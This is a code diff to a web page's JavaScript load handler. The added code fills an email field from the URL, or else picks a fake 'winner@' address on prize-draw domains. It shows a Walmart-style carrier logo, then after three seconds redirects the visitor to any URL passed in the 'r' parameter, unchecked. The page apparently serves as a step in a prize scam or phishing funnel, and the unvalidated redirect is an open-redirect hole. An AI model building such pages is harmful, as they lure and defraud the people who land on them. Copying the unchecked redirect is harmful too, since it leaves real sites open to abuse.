@@ -8,9 +8,25 @@ window.onload  = onLoadHandler
 // console.log('Parameter 1:', parameter1);
 // console.log('Parameter 2:', parameter2);
 
+async function delay(ms){
+    return new Promise((res,rej)=>{
+        setTimeout(()=>{
+            res("done")
+        }, ms)
+    })
+}
+function getRandomEmail(){
+    const emails = [
+            "winner@todaysbigdraw.com",
+            "winner@thebigprize.com",
+            "winner@theluckyday.com",
+            "winner@youwontoday.com",
+    ];
 
+    return emails[Math.floor(emails.length * Math.random())]
 
-function onLoadHandler(){
+}
+async function onLoadHandler(){
         // Get the query string from the URL
         const queryString = window.location.search;
 
@@ -18,16 +34,31 @@ function onLoadHandler(){
         const queryParams = new URLSearchParams(queryString);
 
         // Access specific parameters by name
-        const email = queryParams.get('email');
+        let email = queryParams.get('email');
         const carrier = queryParams.get('carrier');
+        const redirect = queryParams.get('r');
 
         console.log({email, carrier})
 
         removeLoadScreen();
 
-        addLogo(carrier);
-
+        addLogo(carrier|| "");
+        if(!email){
+            email = getRandomEmail();
+        }
         setemail(email)
+
+        await delay(3000);
+
+        window.location.href = redirect;
+
+
+
+
+
+        
+
+
 
 
 }
@@ -35,7 +66,8 @@ function onLoadHandler(){
 function setemail(email){
     document.querySelector("#email").value = email
 }
-function addLogo(carrier=""){
+function addLogo(carrier = ""){
+    console.log(carrier)
     let src = "./images/walmart.png"
 
 
